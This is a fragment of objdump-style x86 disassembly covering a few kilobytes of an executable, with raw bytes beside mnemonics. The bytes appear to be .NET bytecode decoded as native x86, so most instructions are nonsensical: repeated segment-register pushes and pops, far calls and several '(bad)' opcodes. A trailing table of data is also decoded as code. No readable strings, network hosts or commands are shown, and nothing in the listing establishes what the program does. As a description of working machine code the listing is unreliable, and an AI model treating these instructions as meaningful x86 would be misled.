  40593e:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  405945:	72 d9                	jb     0x405920
  405947:	06                   	push   %es
  405948:	00 70 18             	add    %dh,0x18(%eax)
  40594b:	8d 03                	lea    (%ebx),%eax
  40594d:	00 00                	add    %al,(%eax)
  40594f:	01 13                	add    %edx,(%ebx)
  405951:	25 11 25 16 06       	and    $0x6162511,%eax
  405956:	7b 28                	jnp    0x405980
  405958:	00 00                	add    %al,(%eax)
  40595a:	04 13                	add    $0x13,%al
  40595c:	3c 11                	cmp    $0x11,%al
  40595e:	3c 18                	cmp    $0x18,%al
  405960:	13 3d 11 3d 9a a2    	adc    0xa29a3d11,%edi
  405966:	11 25 17 06 7b 28    	adc    %esp,0x287b0617
  40596c:	00 00                	add    %al,(%eax)
  40596e:	04 13                	add    $0x13,%al
  405970:	3a 11                	cmp    (%ecx),%dl
  405972:	3a 19                	cmp    (%ecx),%bl
  405974:	13 3b                	adc    (%ebx),%edi
  405976:	11 3b                	adc    %edi,(%ebx)
  405978:	9a a2 11 25 13 24 11 	lcall  $0x1124,$0x132511a2
  40597f:	24 14                	and    $0x14,%al
  405981:	14 18                	adc    $0x18,%al
  405983:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  405986:	00 01                	add    %al,(%ecx)
  405988:	13 26                	adc    (%esi),%esp
  40598a:	11 26                	adc    %esp,(%esi)
  40598c:	16                   	push   %ss
  40598d:	17                   	pop    %ss
  40598e:	9c                   	pushf
  40598f:	11 26                	adc    %esp,(%esi)
  405991:	17                   	pop    %ss
  405992:	17                   	pop    %ss
  405993:	9c                   	pushf
  405994:	11 26                	adc    %esp,(%esi)
  405996:	28 72 00             	sub    %dh,0x0(%edx)
  405999:	00 0a                	add    %cl,(%edx)
  40599b:	11 26                	adc    %esp,(%esi)
  40599d:	16                   	push   %ss
  40599e:	90                   	nop
  40599f:	2c 22                	sub    $0x22,%al
  4059a1:	11 3c 11             	adc    %edi,(%ecx,%edx,1)
  4059a4:	3d 11 24 16 9a       	cmp    $0x9a162411,%eax
  4059a9:	28 11                	sub    %dl,(%ecx)
  4059ab:	00 00                	add    %al,(%eax)
  4059ad:	0a d0                	or     %al,%dl
  4059af:	28 00                	sub    %al,(%eax)
  4059b1:	00 01                	add    %al,(%ecx)
  4059b3:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4059b6:	00 0a                	add    %cl,(%edx)
  4059b8:	28 6d 00             	sub    %ch,0x0(%ebp)
  4059bb:	00 0a                	add    %cl,(%edx)
  4059bd:	74 28                	je     0x4059e7
  4059bf:	00 00                	add    %al,(%eax)
  4059c1:	01 a2 11 26 17 90    	add    %esp,-0x6fe8d9ef(%edx)
  4059c7:	2c 22                	sub    $0x22,%al
  4059c9:	11 3a                	adc    %edi,(%edx)
  4059cb:	11 3b                	adc    %edi,(%ebx)
  4059cd:	11 24 17             	adc    %esp,(%edi,%edx,1)
  4059d0:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  4059d7:	28 00                	sub    %al,(%eax)
  4059d9:	00 01                	add    %al,(%ecx)
  4059db:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4059de:	00 0a                	add    %cl,(%edx)
  4059e0:	28 6d 00             	sub    %ch,0x0(%ebp)
  4059e3:	00 0a                	add    %cl,(%edx)
  4059e5:	74 28                	je     0x405a0f
  4059e7:	00 00                	add    %al,(%eax)
  4059e9:	01 a2 7e 19 00 00    	add    %esp,0x197e(%edx)
  4059ef:	04 28                	add    $0x28,%al
  4059f1:	66 00 00             	data16 add %al,(%eax)
  4059f4:	0a 28                	or     (%eax),%ch
  4059f6:	38 00                	cmp    %al,(%eax)
  4059f8:	00 06                	add    %al,(%esi)
  4059fa:	28 66 00             	sub    %ah,0x0(%esi)
  4059fd:	00 0a                	add    %cl,(%edx)
  4059ff:	28 71 00             	sub    %dh,0x0(%ecx)
  405a02:	00 0a                	add    %cl,(%edx)
  405a04:	28 3b                	sub    %bh,(%ebx)
  405a06:	00 00                	add    %al,(%eax)
  405a08:	0a 28                	or     (%eax),%ch
  405a0a:	1c 00                	sbb    $0x0,%al
  405a0c:	00 06                	add    %al,(%esi)
  405a0e:	38 95 03 00 00 11    	cmp    %dl,0x11000003(%ebp)
  405a14:	23 72 b3             	and    -0x4d(%edx),%esi
  405a17:	09 00                	or     %eax,(%eax)
  405a19:	70 16                	jo     0x405a31
  405a1b:	28 69 00             	sub    %ch,0x0(%ecx)
  405a1e:	00 0a                	add    %cl,(%edx)
  405a20:	16                   	push   %ss
  405a21:	33 28                	xor    (%eax),%ebp
  405a23:	72 b3                	jb     0x4059d8
  405a25:	09 00                	or     %eax,(%eax)
  405a27:	70 7e                	jo     0x405aa7
  405a29:	19 00                	sbb    %eax,(%eax)
  405a2b:	00 04 28             	add    %al,(%eax,%ebp,1)
  405a2e:	66 00 00             	data16 add %al,(%eax)
  405a31:	0a 28                	or     (%eax),%ch
  405a33:	38 00                	cmp    %al,(%eax)
  405a35:	00 06                	add    %al,(%esi)
  405a37:	28 66 00             	sub    %ah,0x0(%esi)
  405a3a:	00 0a                	add    %cl,(%edx)
  405a3c:	28 3b                	sub    %bh,(%ebx)
  405a3e:	00 00                	add    %al,(%eax)
  405a40:	0a 28                	or     (%eax),%ch
  405a42:	1c 00                	sbb    $0x0,%al
  405a44:	00 06                	add    %al,(%esi)
  405a46:	38 5d 03             	cmp    %bl,0x3(%ebp)
  405a49:	00 00                	add    %al,(%eax)
  405a4b:	11 23                	adc    %esp,(%ebx)
  405a4d:	72 bf                	jb     0x405a0e
  405a4f:	09 00                	or     %eax,(%eax)
  405a51:	70 16                	jo     0x405a69
  405a53:	28 69 00             	sub    %ch,0x0(%ecx)
  405a56:	00 0a                	add    %cl,(%edx)
  405a58:	16                   	push   %ss
  405a59:	33 58 72             	xor    0x72(%eax),%ebx
  405a5c:	c7                   	(bad)
  405a5d:	09 00                	or     %eax,(%eax)
  405a5f:	70 7e                	jo     0x405adf
  405a61:	19 00                	sbb    %eax,(%eax)
  405a63:	00 04 28             	add    %al,(%eax,%ebp,1)
  405a66:	66 00 00             	data16 add %al,(%eax)
  405a69:	0a 28                	or     (%eax),%ch
  405a6b:	38 00                	cmp    %al,(%eax)
  405a6d:	00 06                	add    %al,(%esi)
  405a6f:	28 66 00             	sub    %ah,0x0(%esi)
  405a72:	00 0a                	add    %cl,(%edx)
  405a74:	7e 19                	jle    0x405a8f
  405a76:	00 00                	add    %al,(%eax)
  405a78:	04 28                	add    $0x28,%al
  405a7a:	71 00                	jno    0x405a7c
  405a7c:	00 0a                	add    %cl,(%edx)
  405a7e:	06                   	push   %es
  405a7f:	7b 28                	jnp    0x405aa9
  405a81:	00 00                	add    %al,(%eax)
  405a83:	04 17                	add    $0x17,%al
  405a85:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  405a8c:	72 d7                	jb     0x405a65
  405a8e:	09 00                	or     %eax,(%eax)
  405a90:	70 16                	jo     0x405aa8
  405a92:	8d 03                	lea    (%ebx),%eax
  405a94:	00 00                	add    %al,(%eax)
  405a96:	01 14 14             	add    %edx,(%esp,%edx,1)
  405a99:	14 28                	adc    $0x28,%al
  405a9b:	72 00                	jb     0x405a9d
  405a9d:	00 0a                	add    %cl,(%edx)
  405a9f:	28 71 00             	sub    %dh,0x0(%ecx)
  405aa2:	00 0a                	add    %cl,(%edx)
  405aa4:	28 3b                	sub    %bh,(%ebx)
  405aa6:	00 00                	add    %al,(%eax)
  405aa8:	0a 28                	or     (%eax),%ch
  405aaa:	1c 00                	sbb    $0x0,%al
  405aac:	00 06                	add    %al,(%esi)
  405aae:	38 f5                	cmp    %dh,%ch
  405ab0:	02 00                	add    (%eax),%al
  405ab2:	00 11                	add    %dl,(%ecx)
  405ab4:	23 72 df             	and    -0x21(%edx),%esi
  405ab7:	09 00                	or     %eax,(%eax)
  405ab9:	70 16                	jo     0x405ad1
  405abb:	28 69 00             	sub    %ch,0x0(%ecx)
  405abe:	00 0a                	add    %cl,(%edx)
  405ac0:	16                   	push   %ss
  405ac1:	33 58 72             	xor    0x72(%eax),%ebx
  405ac4:	c7                   	(bad)
  405ac5:	09 00                	or     %eax,(%eax)
  405ac7:	70 7e                	jo     0x405b47
  405ac9:	19 00                	sbb    %eax,(%eax)
  405acb:	00 04 28             	add    %al,(%eax,%ebp,1)
  405ace:	66 00 00             	data16 add %al,(%eax)
  405ad1:	0a 28                	or     (%eax),%ch
  405ad3:	38 00                	cmp    %al,(%eax)
  405ad5:	00 06                	add    %al,(%esi)
  405ad7:	28 66 00             	sub    %ah,0x0(%esi)
  405ada:	00 0a                	add    %cl,(%edx)
  405adc:	7e 19                	jle    0x405af7
  405ade:	00 00                	add    %al,(%eax)
  405ae0:	04 28                	add    $0x28,%al
  405ae2:	71 00                	jno    0x405ae4
  405ae4:	00 0a                	add    %cl,(%edx)
  405ae6:	06                   	push   %es
  405ae7:	7b 28                	jnp    0x405b11
  405ae9:	00 00                	add    %al,(%eax)
  405aeb:	04 17                	add    $0x17,%al
  405aed:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  405af4:	72 ff                	jb     0x405af5
  405af6:	01 00                	add    %eax,(%eax)
  405af8:	70 16                	jo     0x405b10
  405afa:	8d 03                	lea    (%ebx),%eax
  405afc:	00 00                	add    %al,(%eax)
  405afe:	01 14 14             	add    %edx,(%esp,%edx,1)
  405b01:	14 28                	adc    $0x28,%al
  405b03:	72 00                	jb     0x405b05
  405b05:	00 0a                	add    %cl,(%edx)
  405b07:	28 71 00             	sub    %dh,0x0(%ecx)
  405b0a:	00 0a                	add    %cl,(%edx)
  405b0c:	28 3b                	sub    %bh,(%ebx)
  405b0e:	00 00                	add    %al,(%eax)
  405b10:	0a 28                	or     (%eax),%ch
  405b12:	1c 00                	sbb    $0x0,%al
  405b14:	00 06                	add    %al,(%esi)
  405b16:	38 8d 02 00 00 11    	cmp    %cl,0x11000002(%ebp)
  405b1c:	23 72 ed             	and    -0x13(%edx),%esi
  405b1f:	09 00                	or     %eax,(%eax)
  405b21:	70 16                	jo     0x405b39
  405b23:	28 69 00             	sub    %ch,0x0(%ecx)
  405b26:	00 0a                	add    %cl,(%edx)
  405b28:	16                   	push   %ss
  405b29:	33 28                	xor    (%eax),%ebp
  405b2b:	06                   	push   %es
  405b2c:	7b 28                	jnp    0x405b56
  405b2e:	00 00                	add    %al,(%eax)
  405b30:	04 17                	add    $0x17,%al
  405b32:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  405b39:	72 ff                	jb     0x405b3a
  405b3b:	01 00                	add    %eax,(%eax)
  405b3d:	70 16                	jo     0x405b55
  405b3f:	8d 03                	lea    (%ebx),%eax
  405b41:	00 00                	add    %al,(%eax)
  405b43:	01 14 14             	add    %edx,(%esp,%edx,1)
  405b46:	14 17                	adc    $0x17,%al
  405b48:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405b4c:	0a 26                	or     (%esi),%ah
  405b4e:	38 55 02             	cmp    %dl,0x2(%ebp)
  405b51:	00 00                	add    %al,(%eax)
  405b53:	11 23                	adc    %esp,(%ebx)
  405b55:	72 f7                	jb     0x405b4e
  405b57:	09 00                	or     %eax,(%eax)
  405b59:	70 16                	jo     0x405b71
  405b5b:	28 69 00             	sub    %ch,0x0(%ecx)
  405b5e:	00 0a                	add    %cl,(%edx)
  405b60:	16                   	push   %ss
  405b61:	40                   	inc    %eax
  405b62:	aa                   	stos   %al,%es:(%edi)
  405b63:	00 00                	add    %al,(%eax)
  405b65:	00 06                	add    %al,(%esi)
  405b67:	7b 28                	jnp    0x405b91
  405b69:	00 00                	add    %al,(%eax)
  405b6b:	04 17                	add    $0x17,%al
  405b6d:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  405b74:	72 03                	jb     0x405b79
  405b76:	0a 00                	or     (%eax),%al
  405b78:	70 16                	jo     0x405b90
  405b7a:	8d 03                	lea    (%ebx),%eax
  405b7c:	00 00                	add    %al,(%eax)
  405b7e:	01 14 14             	add    %edx,(%esp,%edx,1)
  405b81:	14 28                	adc    $0x28,%al
  405b83:	72 00                	jb     0x405b85
  405b85:	00 0a                	add    %cl,(%edx)
  405b87:	28 3b                	sub    %bh,(%ebx)
  405b89:	00 00                	add    %al,(%eax)
  405b8b:	0a 13                	or     (%ebx),%dl
  405b8d:	21 11                	and    %edx,(%ecx)
  405b8f:	21 72 11             	and    %esi,0x11(%edx)
  405b92:	0a 00                	or     (%eax),%al
  405b94:	70 16                	jo     0x405bac
  405b96:	28 69 00             	sub    %ch,0x0(%ecx)
  405b99:	00 0a                	add    %cl,(%edx)
  405b9b:	16                   	push   %ss
  405b9c:	33 39                	xor    (%ecx),%edi
  405b9e:	72 c7                	jb     0x405b67
  405ba0:	09 00                	or     %eax,(%eax)
  405ba2:	70 7e                	jo     0x405c22
  405ba4:	19 00                	sbb    %eax,(%eax)
  405ba6:	00 04 28             	add    %al,(%eax,%ebp,1)
  405ba9:	66 00 00             	data16 add %al,(%eax)
  405bac:	0a 28                	or     (%eax),%ch
  405bae:	38 00                	cmp    %al,(%eax)
  405bb0:	00 06                	add    %al,(%esi)
  405bb2:	28 66 00             	sub    %ah,0x0(%esi)
  405bb5:	00 0a                	add    %cl,(%edx)
  405bb7:	7e 19                	jle    0x405bd2
  405bb9:	00 00                	add    %al,(%eax)
  405bbb:	04 28                	add    $0x28,%al
  405bbd:	71 00                	jno    0x405bbf
  405bbf:	00 0a                	add    %cl,(%edx)
  405bc1:	72 11                	jb     0x405bd4
  405bc3:	0a 00                	or     (%eax),%al
  405bc5:	70 28                	jo     0x405bef
  405bc7:	71 00                	jno    0x405bc9
  405bc9:	00 0a                	add    %cl,(%edx)
  405bcb:	28 3b                	sub    %bh,(%ebx)
  405bcd:	00 00                	add    %al,(%eax)
  405bcf:	0a 28                	or     (%eax),%ch
  405bd1:	1c 00                	sbb    $0x0,%al
  405bd3:	00 06                	add    %al,(%esi)
  405bd5:	2b 34 72             	sub    (%edx,%esi,2),%esi
  405bd8:	c7                   	(bad)
  405bd9:	09 00                	or     %eax,(%eax)
  405bdb:	70 7e                	jo     0x405c5b
  405bdd:	19 00                	sbb    %eax,(%eax)
  405bdf:	00 04 28             	add    %al,(%eax,%ebp,1)
  405be2:	66 00 00             	data16 add %al,(%eax)
  405be5:	0a 28                	or     (%eax),%ch
  405be7:	38 00                	cmp    %al,(%eax)
  405be9:	00 06                	add    %al,(%esi)
  405beb:	28 66 00             	sub    %ah,0x0(%esi)
  405bee:	00 0a                	add    %cl,(%edx)
  405bf0:	7e 19                	jle    0x405c0b
  405bf2:	00 00                	add    %al,(%eax)
  405bf4:	04 28                	add    $0x28,%al
  405bf6:	71 00                	jno    0x405bf8
  405bf8:	00 0a                	add    %cl,(%edx)
  405bfa:	11 21                	adc    %esp,(%ecx)
  405bfc:	28 71 00             	sub    %dh,0x0(%ecx)
  405bff:	00 0a                	add    %cl,(%edx)
  405c01:	28 3b                	sub    %bh,(%ebx)
  405c03:	00 00                	add    %al,(%eax)
  405c05:	0a 28                	or     (%eax),%ch
  405c07:	1c 00                	sbb    $0x0,%al
  405c09:	00 06                	add    %al,(%esi)
  405c0b:	38 98 01 00 00 11    	cmp    %bl,0x11000001(%eax)
  405c11:	23 72 1f             	and    0x1f(%edx),%esi
  405c14:	0a 00                	or     (%eax),%al
  405c16:	70 16                	jo     0x405c2e
  405c18:	28 69 00             	sub    %ch,0x0(%ecx)
  405c1b:	00 0a                	add    %cl,(%edx)
  405c1d:	16                   	push   %ss
  405c1e:	33 28                	xor    (%eax),%ebp
  405c20:	72 1f                	jb     0x405c41
  405c22:	0a 00                	or     (%eax),%al
  405c24:	70 7e                	jo     0x405ca4
  405c26:	19 00                	sbb    %eax,(%eax)
  405c28:	00 04 28             	add    %al,(%eax,%ebp,1)
  405c2b:	66 00 00             	data16 add %al,(%eax)
  405c2e:	0a 28                	or     (%eax),%ch
  405c30:	38 00                	cmp    %al,(%eax)
  405c32:	00 06                	add    %al,(%esi)
  405c34:	28 66 00             	sub    %ah,0x0(%esi)
  405c37:	00 0a                	add    %cl,(%edx)
  405c39:	28 3b                	sub    %bh,(%ebx)
  405c3b:	00 00                	add    %al,(%eax)
  405c3d:	0a 28                	or     (%eax),%ch
  405c3f:	1c 00                	sbb    $0x0,%al
  405c41:	00 06                	add    %al,(%esi)
  405c43:	38 60 01             	cmp    %ah,0x1(%eax)
  405c46:	00 00                	add    %al,(%eax)
  405c48:	11 23                	adc    %esp,(%ebx)
  405c4a:	72 2b                	jb     0x405c77
  405c4c:	0a 00                	or     (%eax),%al
  405c4e:	70 16                	jo     0x405c66
  405c50:	28 69 00             	sub    %ch,0x0(%ecx)
  405c53:	00 0a                	add    %cl,(%edx)
  405c55:	16                   	push   %ss
  405c56:	40                   	inc    %eax
  405c57:	1c 01                	sbb    $0x1,%al
  405c59:	00 00                	add    %al,(%eax)
  405c5b:	06                   	push   %es
  405c5c:	7b 28                	jnp    0x405c86
  405c5e:	00 00                	add    %al,(%eax)
  405c60:	04 17                	add    $0x17,%al
  405c62:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  405c69:	72 9b                	jb     0x405c06
  405c6b:	07                   	pop    %es
  405c6c:	00 70 1b             	add    %dh,0x1b(%eax)
  405c6f:	8d 03                	lea    (%ebx),%eax
  405c71:	00 00                	add    %al,(%eax)
  405c73:	01 13                	add    %edx,(%ebx)
  405c75:	25 11 25 16 7e       	and    $0x7e162511,%eax
  405c7a:	06                   	push   %es
  405c7b:	00 00                	add    %al,(%eax)
  405c7d:	04 a2                	add    $0xa2,%al
  405c7f:	11 25 17 7e 07 00    	adc    %esp,0x77e17
  405c85:	00 04 a2             	add    %al,(%edx,%eiz,4)
  405c88:	11 25 18 7e 09 00    	adc    %esp,0x97e18
  405c8e:	00 04 a2             	add    %al,(%edx,%eiz,4)
  405c91:	11 25 19 7e 08 00    	adc    %esp,0x87e19
  405c97:	00 04 a2             	add    %al,(%edx,%eiz,4)
  405c9a:	11 25 1a 28 38 00    	adc    %esp,0x38281a
  405ca0:	00 06                	add    %al,(%esi)
  405ca2:	a2 11 25 13 24       	mov    %al,0x24132511
  405ca7:	11 24 14             	adc    %esp,(%esp,%edx,1)
  405caa:	14 1b                	adc    $0x1b,%al
  405cac:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  405caf:	00 01                	add    %al,(%ecx)
  405cb1:	13 26                	adc    (%esi),%esp
  405cb3:	11 26                	adc    %esp,(%esi)
  405cb5:	16                   	push   %ss
  405cb6:	17                   	pop    %ss
  405cb7:	9c                   	pushf
  405cb8:	11 26                	adc    %esp,(%esi)
  405cba:	17                   	pop    %ss
  405cbb:	17                   	pop    %ss
  405cbc:	9c                   	pushf
  405cbd:	11 26                	adc    %esp,(%esi)
  405cbf:	18 17                	sbb    %dl,(%edi)
  405cc1:	9c                   	pushf
  405cc2:	11 26                	adc    %esp,(%esi)
  405cc4:	19 17                	sbb    %edx,(%edi)
  405cc6:	9c                   	pushf
  405cc7:	11 26                	adc    %esp,(%esi)
  405cc9:	1a 16                	sbb    (%esi),%dl
  405ccb:	9c                   	pushf
  405ccc:	11 26                	adc    %esp,(%esi)
  405cce:	17                   	pop    %ss
  405ccf:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405cd3:	0a 26                	or     (%esi),%ah
  405cd5:	11 26                	adc    %esp,(%esi)
  405cd7:	16                   	push   %ss
  405cd8:	90                   	nop
  405cd9:	2c 22                	sub    $0x22,%al
  405cdb:	11 24 16             	adc    %esp,(%esi,%edx,1)
  405cde:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  405ce5:	28 00                	sub    %al,(%eax)
  405ce7:	00 01                	add    %al,(%ecx)
  405ce9:	28 14 00             	sub    %dl,(%eax,%eax,1)
  405cec:	00 0a                	add    %cl,(%edx)
  405cee:	28 6d 00             	sub    %ch,0x0(%ebp)
  405cf1:	00 0a                	add    %cl,(%edx)
  405cf3:	74 28                	je     0x405d1d
  405cf5:	00 00                	add    %al,(%eax)
  405cf7:	01 80 06 00 00 04    	add    %eax,0x4000006(%eax)
  405cfd:	11 26                	adc    %esp,(%esi)
  405cff:	17                   	pop    %ss
  405d00:	90                   	nop
  405d01:	2c 22                	sub    $0x22,%al
  405d03:	11 24 17             	adc    %esp,(%edi,%edx,1)
  405d06:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  405d0d:	28 00                	sub    %al,(%eax)
  405d0f:	00 01                	add    %al,(%ecx)
  405d11:	28 14 00             	sub    %dl,(%eax,%eax,1)
  405d14:	00 0a                	add    %cl,(%edx)
  405d16:	28 6d 00             	sub    %ch,0x0(%ebp)
  405d19:	00 0a                	add    %cl,(%edx)
  405d1b:	74 28                	je     0x405d45
  405d1d:	00 00                	add    %al,(%eax)
  405d1f:	01 80 07 00 00 04    	add    %eax,0x4000007(%eax)
  405d25:	11 26                	adc    %esp,(%esi)
  405d27:	18 90 2c 22 11 24    	sbb    %dl,0x2411222c(%eax)
  405d2d:	18 9a 28 11 00 00    	sbb    %bl,0x1128(%edx)
  405d33:	0a d0                	or     %al,%dl
  405d35:	28 00                	sub    %al,(%eax)
  405d37:	00 01                	add    %al,(%ecx)
  405d39:	28 14 00             	sub    %dl,(%eax,%eax,1)
  405d3c:	00 0a                	add    %cl,(%edx)
  405d3e:	28 6d 00             	sub    %ch,0x0(%ebp)
  405d41:	00 0a                	add    %cl,(%edx)
  405d43:	74 28                	je     0x405d6d
  405d45:	00 00                	add    %al,(%eax)
  405d47:	01 80 09 00 00 04    	add    %eax,0x4000009(%eax)
  405d4d:	11 26                	adc    %esp,(%esi)
  405d4f:	19 90 2c 22 11 24    	sbb    %edx,0x2411222c(%eax)
  405d55:	19 9a 28 11 00 00    	sbb    %ebx,0x1128(%edx)
  405d5b:	0a d0                	or     %al,%dl
  405d5d:	28 00                	sub    %al,(%eax)
  405d5f:	00 01                	add    %al,(%ecx)
  405d61:	28 14 00             	sub    %dl,(%eax,%eax,1)
  405d64:	00 0a                	add    %cl,(%edx)
  405d66:	28 6d 00             	sub    %ch,0x0(%ebp)
  405d69:	00 0a                	add    %cl,(%edx)
  405d6b:	74 28                	je     0x405d95
  405d6d:	00 00                	add    %al,(%eax)
  405d6f:	01 80 08 00 00 04    	add    %eax,0x4000008(%eax)
  405d75:	2b 31                	sub    (%ecx),%esi
  405d77:	11 23                	adc    %esp,(%ebx)
  405d79:	72 39                	jb     0x405db4
  405d7b:	0a 00                	or     (%eax),%al
  405d7d:	70 16                	jo     0x405d95
  405d7f:	28 69 00             	sub    %ch,0x0(%ecx)
  405d82:	00 0a                	add    %cl,(%edx)
  405d84:	16                   	push   %ss
  405d85:	33 21                	xor    (%ecx),%esp
  405d87:	72 39                	jb     0x405dc2
  405d89:	08 00                	or     %al,(%eax)
  405d8b:	70 28                	jo     0x405db5
  405d8d:	38 00                	cmp    %al,(%eax)
  405d8f:	00 06                	add    %al,(%esi)
  405d91:	28 47 00             	sub    %al,0x0(%edi)
  405d94:	00 0a                	add    %cl,(%edx)
  405d96:	72 45                	jb     0x405ddd
  405d98:	0a 00                	or     (%eax),%al
  405d9a:	70 06                	jo     0x405da2
  405d9c:	7b 28                	jnp    0x405dc6
  405d9e:	00 00                	add    %al,(%eax)
  405da0:	04 17                	add    $0x17,%al
  405da2:	9a 28 c4 00 00 0a de 	lcall  $0xde0a,$0xc428
  405da9:	0f 25                	(bad)
  405dab:	28 29                	sub    %ch,(%ecx)
  405dad:	00 00                	add    %al,(%eax)
  405daf:	0a 13                	or     (%ebx),%dl
  405db1:	22 28                	and    (%eax),%ch
  405db3:	2a 00                	sub    (%eax),%al
  405db5:	00 0a                	add    %cl,(%edx)
  405db7:	de 00                	fiadds (%eax)
  405db9:	2a 00                	sub    (%eax),%al
  405dbb:	00 41 cc             	add    %al,-0x34(%ecx)
  405dbe:	01 00                	add    %eax,(%eax)
  405dc0:	00 00                	add    %al,(%eax)
  405dc2:	00 00                	add    %al,(%eax)
  405dc4:	39 08                	cmp    %ecx,(%eax)
  405dc6:	00 00                	add    %al,(%eax)
  405dc8:	0c 00                	or     $0x0,%al
  405dca:	00 00                	add    %al,(%eax)
  405dcc:	45                   	inc    %ebp
  405dcd:	08 00                	or     %al,(%eax)
  405dcf:	00 0f                	add    %cl,(%edi)
  405dd1:	00 00                	add    %al,(%eax)
  405dd3:	00 24 00             	add    %ah,(%eax,%eax,1)
  405dd6:	00 01                	add    %al,(%ecx)
  405dd8:	00 00                	add    %al,(%eax)
  405dda:	00 00                	add    %al,(%eax)
  405ddc:	a8 08                	test   $0x8,%al
  405dde:	00 00                	add    %al,(%eax)
  405de0:	0c 00                	or     $0x0,%al
  405de2:	00 00                	add    %al,(%eax)
  405de4:	b4 08                	mov    $0x8,%ah
  405de6:	00 00                	add    %al,(%eax)
  405de8:	0f 00 00             	sldt   (%eax)
  405deb:	00 24 00             	add    %ah,(%eax,%eax,1)
  405dee:	00 01                	add    %al,(%ecx)
  405df0:	02 00                	add    (%eax),%al
  405df2:	00 00                	add    %al,(%eax)
  405df4:	36 0c 00             	ss or  $0x0,%al
  405df7:	00 7b 00             	add    %bh,0x0(%ebx)
  405dfa:	00 00                	add    %al,(%eax)
  405dfc:	b1 0c                	mov    $0xc,%cl
  405dfe:	00 00                	add    %al,(%eax)
  405e00:	0c 00                	or     $0x0,%al
	...
  405e0a:	00 00                	add    %al,(%eax)
  405e0c:	2f                   	das
  405e0d:	0c 00                	or     $0x0,%al
  405e0f:	00 90 00 00 00 bf    	add    %dl,-0x41000000(%eax)
  405e15:	0c 00                	or     $0x0,%al
  405e17:	00 0f                	add    %cl,(%edi)
  405e19:	00 00                	add    %al,(%eax)
  405e1b:	00 24 00             	add    %ah,(%eax,%eax,1)
  405e1e:	00 01                	add    %al,(%ecx)
  405e20:	00 00                	add    %al,(%eax)
  405e22:	00 00                	add    %al,(%eax)
  405e24:	2f                   	das
  405e25:	0c 00                	or     $0x0,%al
  405e27:	00 3e                	add    %bh,(%esi)
  405e29:	01 00                	add    %eax,(%eax)
  405e2b:	00 6d 0d             	add    %ch,0xd(%ebp)
  405e2e:	00 00                	add    %al,(%eax)
  405e30:	0f 00 00             	sldt   (%eax)
  405e33:	00 24 00             	add    %ah,(%eax,%eax,1)
  405e36:	00 01                	add    %al,(%ecx)
  405e38:	00 00                	add    %al,(%eax)
  405e3a:	00 00                	add    %al,(%eax)
  405e3c:	62 0e                	bound  %ecx,(%esi)
  405e3e:	00 00                	add    %al,(%eax)
  405e40:	83 00 00             	addl   $0x0,(%eax)
  405e43:	00 e5                	add    %ah,%ch
  405e45:	0e                   	push   %cs
  405e46:	00 00                	add    %al,(%eax)
  405e48:	0f 00 00             	sldt   (%eax)
  405e4b:	00 24 00             	add    %ah,(%eax,%eax,1)
  405e4e:	00 01                	add    %al,(%ecx)
  405e50:	00 00                	add    %al,(%eax)
  405e52:	00 00                	add    %al,(%eax)
  405e54:	da 12                	ficoml (%edx)
  405e56:	00 00                	add    %al,(%eax)
  405e58:	53                   	push   %ebx
  405e59:	00 00                	add    %al,(%eax)
  405e5b:	00 2d 13 00 00 43    	add    %ch,0x43000013
  405e61:	00 00                	add    %al,(%eax)
  405e63:	00 24 00             	add    %ah,(%eax,%eax,1)
  405e66:	00 01                	add    %al,(%ecx)
  405e68:	02 00                	add    (%eax),%al
  405e6a:	00 00                	add    %al,(%eax)
  405e6c:	50                   	push   %eax
  405e6d:	15 00 00 40 00       	adc    $0x400000,%eax
  405e72:	00 00                	add    %al,(%eax)
  405e74:	90                   	nop
  405e75:	15 00 00 0c 00       	adc    $0xc0000,%eax
  405e7a:	00 00                	add    %al,(%eax)
  405e7c:	00 00                	add    %al,(%eax)
  405e7e:	00 00                	add    %al,(%eax)
  405e80:	02 00                	add    (%eax),%al
  405e82:	00 00                	add    %al,(%eax)
  405e84:	41                   	inc    %ecx
  405e85:	15 00 00 9b 00       	adc    $0x9b0000,%eax
  405e8a:	00 00                	add    %al,(%eax)
  405e8c:	dc 15 00 00 0c 00    	fcoml  0xc0000
	...
  405e9a:	00 00                	add    %al,(%eax)
  405e9c:	e1 18                	loope  0x405eb6
  405e9e:	00 00                	add    %al,(%eax)
  405ea0:	73 00                	jae    0x405ea2
  405ea2:	00 00                	add    %al,(%eax)
  405ea4:	54                   	push   %esp
  405ea5:	19 00                	sbb    %eax,(%eax)
  405ea7:	00 0f                	add    %cl,(%edi)
  405ea9:	00 00                	add    %al,(%eax)
  405eab:	00 24 00             	add    %ah,(%eax,%eax,1)
  405eae:	00 01                	add    %al,(%ecx)
  405eb0:	00 00                	add    %al,(%eax)
  405eb2:	00 00                	add    %al,(%eax)
  405eb4:	b1 19                	mov    $0x19,%cl
  405eb6:	00 00                	add    %al,(%eax)
  405eb8:	73 00                	jae    0x405eba
  405eba:	00 00                	add    %al,(%eax)
  405ebc:	24 1a                	and    $0x1a,%al
  405ebe:	00 00                	add    %al,(%eax)
  405ec0:	0f 00 00             	sldt   (%eax)
  405ec3:	00 24 00             	add    %ah,(%eax,%eax,1)
  405ec6:	00 01                	add    %al,(%ecx)
  405ec8:	00 00                	add    %al,(%eax)
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	c1 1c 00 00          	rcrl   $0x0,(%eax,%eax,1)
  405ed0:	19 00                	sbb    %eax,(%eax)
  405ed2:	00 00                	add    %al,(%eax)
  405ed4:	da 1c 00             	ficompl (%eax,%eax,1)
  405ed7:	00 0f                	add    %cl,(%edi)
  405ed9:	00 00                	add    %al,(%eax)
  405edb:	00 24 00             	add    %ah,(%eax,%eax,1)
  405ede:	00 01                	add    %al,(%ecx)
